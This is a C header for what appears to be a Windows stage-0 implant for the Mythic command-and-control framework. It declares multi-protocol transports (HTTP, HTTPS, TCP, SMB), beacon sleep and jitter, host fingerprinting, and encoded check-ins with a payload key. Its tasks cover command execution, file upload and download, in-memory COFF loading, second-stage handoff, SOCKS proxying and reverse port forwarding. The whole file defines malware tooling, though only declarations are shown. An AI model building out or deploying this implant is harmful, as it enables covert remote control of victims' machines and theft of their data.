#ifndef STAGE0_H
#define STAGE0_H

#include <stddef.h>
#include <stdint.h>
#include <winsock2.h>
#include <windows.h>

#define S0_MAGIC 0x30425342u
#define S0_VERSION 1u
#define S0_MAX_FRAME (1024u * 1024u)
#define S0_IO_CHUNK 65536u

typedef enum {
    S0_T_HTTP = 1,
    S0_T_HTTPS = 2,
    S0_T_TCP = 3,
    S0_T_SMB = 4
} s0_transport_kind;

typedef enum {
    S0_MSG_CHECKIN = 1,
    S0_MSG_TASK = 2,
    S0_MSG_RESULT = 3,
    S0_MSG_FILE = 4,
    S0_MSG_SOCKS = 5,
    S0_MSG_RPFWD = 6,
    S0_MSG_STAGE1 = 7
} s0_message_kind;

typedef enum {
    S0_TASK_EXEC = 1,
    S0_TASK_UPLOAD = 2,
    S0_TASK_DOWNLOAD = 3,
    S0_TASK_COFF = 4,
    S0_TASK_HANDOFF = 5,
    S0_TASK_EXIT = 0xff
} s0_task_kind;

#pragma pack(push, 1)
typedef struct {
    uint32_t magic;
    uint8_t version;
    uint8_t kind;
    uint16_t flags;
    uint32_t stream_id;
    uint32_t length;
    uint32_t checksum;
} s0_frame_header;

typedef struct {
    uint32_t server_id;
    uint32_t port;
    uint32_t length;
    uint8_t exit;
    uint8_t reserved[3];
} s0_proxy_frame;
#pragma pack(pop)

typedef struct {
    uint8_t *data;
    uint32_t length;
    uint32_t capacity;
} s0_buffer;

typedef struct {
    s0_transport_kind kind;
    uint16_t port;
    uint16_t sleep_ms;
    uint16_t jitter_pct;
    uint8_t secure;
    uint8_t reserved;
    wchar_t host[128];
    wchar_t path[96];
    char payload_id[37];
    uint8_t key[32];
} s0_config;

typedef struct s0_transport s0_transport;
struct s0_transport {
    void *state;
    int (*open)(s0_transport *, const s0_config *);
    int (*exchange)(s0_transport *, const uint8_t *, uint32_t, s0_buffer *);
    void (*close)(s0_transport *);
};

typedef int (*s0_coff_loader_fn)(const uint8_t *, uint32_t,
                                 const uint8_t *, uint32_t, s0_buffer *);
typedef void (*s0_stage1_entry_fn)(const s0_config *, const uint8_t *, uint32_t);

uint32_t s0_checksum(const void *data, uint32_t length);
uint64_t s0_host_fingerprint(void);
int s0_buffer_reserve(s0_buffer *b, uint32_t wanted);
void s0_buffer_free(s0_buffer *b);
int s0_frame_pack(uint8_t kind, uint16_t flags, uint32_t stream_id,
                  const void *payload, uint32_t length, s0_buffer *out);
int s0_frame_unpack(const uint8_t *data, uint32_t length,
                    s0_frame_header *header, const uint8_t **payload);
int s0_mythic_encode(const char *uuid, const uint8_t key[32],
                     const void *json, uint32_t json_len, s0_buffer *out);
int s0_mythic_decode(const uint8_t key[32], const void *encoded,
                     uint32_t encoded_len, char uuid[37], s0_buffer *json);
int s0_process_mythic_tasks(const uint8_t *json, uint32_t json_len,
                            uint16_t *sleep_ms, uint16_t *jitter_pct,
                            s0_buffer *response_json);
int s0_proxy_pack(uint8_t kind, uint32_t server_id, uint32_t port,
                  int exit_flag, const void *data, uint32_t length,
                  s0_buffer *out);
int s0_transport_init(s0_transport *transport, s0_transport_kind kind);
int s0_dispatch_task(const uint8_t *task, uint32_t task_len, s0_buffer *result);
void s0_set_coff_loader(s0_coff_loader_fn loader);
int s0_handoff_stage1(const uint8_t *image, uint32_t length,
                      const s0_config *config);
int s0_agent_run(const s0_config *config);
void s0_debug(const wchar_t *message);
void s0_debug_error(const wchar_t *message, DWORD error);

#endif
